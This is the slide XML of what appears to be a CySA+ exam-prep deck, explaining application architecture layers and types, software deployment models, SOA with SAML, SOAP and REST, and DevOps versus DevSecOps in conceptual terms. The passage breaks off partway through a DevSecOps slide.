              <a:t>•  Architecture is analyzed by decomposing an application into layers such as presentation logic (the user interface), business logic (processing and rules), storage (data persistence), and the communication that links them, then mapping which tier or system each layer runs on.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Understanding this distribution reveals where sensitive processing and data live and therefore where trust boundaries and attack surfaces exist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because knowing what happens and where it happens is a prerequisite for threat modeling, choosing the right security controls per tier, and assessing how a vulnerability in one layer can affect the whole system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: On the exam you may need to identify the architectural layer (presentation, business logic, storage, or communication) relevant to a described weakness or control placement.</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523</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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PLATFORMS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Platforms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Software architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What happens and where it happens</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Processing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Presentation logic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Business logic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Communication</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524</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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PLATFORMS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Common Architecture Types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Common application architecture types describe how processing and data are distributed across systems, ranging from fully centralized to fully distributed designs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Host-based architecture runs everything on a single central system with dumb terminals; client-based runs the application on the endpoint; client/server splits work between an endpoint client and a central server; and distributed or n-tier architecture spreads presentation, application, and data functions across multiple separate layers or servers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Each model shifts the trust boundaries and attack surface, so a monolithic host concentrates risk on one system while an n-tier design multiplies the network communication paths that must be secured.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because identifying the architecture type determines where controls belong, how components communicate, and which tiers hold the sensitive data and logic an attacker would target.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CS0-003 may ask you to match an architecture type such as client/server or n-tier to its security implications or to where a control should be applied.</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525</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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PLATFORMS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Common Architecture Types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Host-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Client-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Client/server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Distributed (n-tier)</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526</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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PLATFORMS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Software Considerations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Software considerations are the deployment models an application can use, each carrying distinct security trade-offs that shape how it should be assessed and protected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A thick (or fat) client performs substantial processing locally in a client/server model, a thin client relies on a central server with minimal local logic, a web application is a distributed browser-based design, mobile apps run on portable devices, and embedded software is self-contained code running on dedicated hardware, with a system-on-chip (SoC) being an especially compact embedded form.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Where code and data execute changes the attack surface, so a thick client exposes logic on the endpoint for reverse engineering while a web application concentrates risk in server-side and browser-facing components.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because the software type dictates the appropriate testing approach, patching strategy, and controls, since embedded and mobile software in particular are often harder to update and monitor than server-based applications.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions distinguishing thick versus thin clients, web, mobile, and embedded/SoC software and matching each to its characteristic vulnerabilities or update challenges.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527</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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PLATFORMS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Software Considerations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Client/server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Thick client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Web application</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Distributed, browser-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Mobile</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Thin client</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528</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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PLATFORMS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Software Considerations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Embedded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Self-contained</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  System-on-chip (SoC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  More compact embedded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Firmware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Just the stable code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529</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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Service-Oriented Architecture (SOA)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Service-Oriented Architecture (SOA) is a design in which clients consume discrete, reusable services through APIs, typically over web protocols, using a loosely coupled connection so services can change independently of the clients that call them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOA connections may be persistent (a maintained session) or non-persistent (per-request), and the architecture can be open (exposed to external consumers) or closed (internal only), while cloud computing makes SOA far easier to scale on demand.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because services are loosely coupled and exposed via APIs, SOA relies on standards like Security Assertions Markup Language (SAML) to carry authentication and authorization assertions between the identity provider and the services a client consumes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because each exposed service is an attack surface requiring its own authentication, authorization, and input validation, and misconfigured federation or API security in a SOA can allow unauthorized cross-service access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may reference SAML as the standard for SOA authentication and authorization or test the security implications of loosely coupled, API-consumed services.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530</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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Service-Oriented Architecture (SOA)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SOA clients consume services via APIs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Usually based on web approach</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Loosely-coupled connection between client and server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Two types of connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Persistent</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Non-persistent</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOAs can be open or closed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cloud computing makes SOA far easier to scale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531</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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Service-Oriented Architecture (SOA)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Security Assertions Markup Language (SAML)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Common standard for SOA authentication and authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  SOA implies separate trust zones</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Applications need a standard way to communicate identity and state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532</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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Service-Oriented Architecture (SOA) (3)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Simple Object Access Protocol (SOAP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Early method to invoke services</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  XML over HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Data in envelope approach</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Can be complex</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533</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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Service-Oriented Architecture (SOA) (4)</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Representational State Transfer (REST)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Lightweight and flexible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Preferred for clients with minimal processing capability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on HTTP methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Microservices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Limited scope, loosely coupled services (often REST)</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534</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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DevOps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DevOps is a culture and set of practices that integrate software development with IT operations so the two functions collaborate continuously rather than working in separate silos.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It gives operations direct input into software functionality and quality while giving developers timely, real-world feedback on how their code behaves in production, typically supported by automation, continuous integration, and continuous delivery pipelines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This tighter loop accelerates release cadence and improves reliability, but the automation and shared pipelines it introduces also create new assets that must be secured.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because faster, automated releases can propagate vulnerabilities to production just as quickly, making pipeline security and early testing essential.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: On the exam DevOps is contrasted with DevSecOps, where you must recognize that DevOps alone does not inherently build security into the pipeline.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535</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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DevOps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Integrates operations with software development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Gives operations direct input into software functionality and quality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Developers benefit from timely, relevant perspective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536</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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DevSecOps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DevSecOps extends DevOps by integrating security as a shared responsibility throughout the entire development and operations lifecycle rather than treating it as a final gate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By embedding automated security testing, code analysis, and controls into the CI/CD pipeline, it raises the priority of security so it is designed in from the start instead of bolted on afterward.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
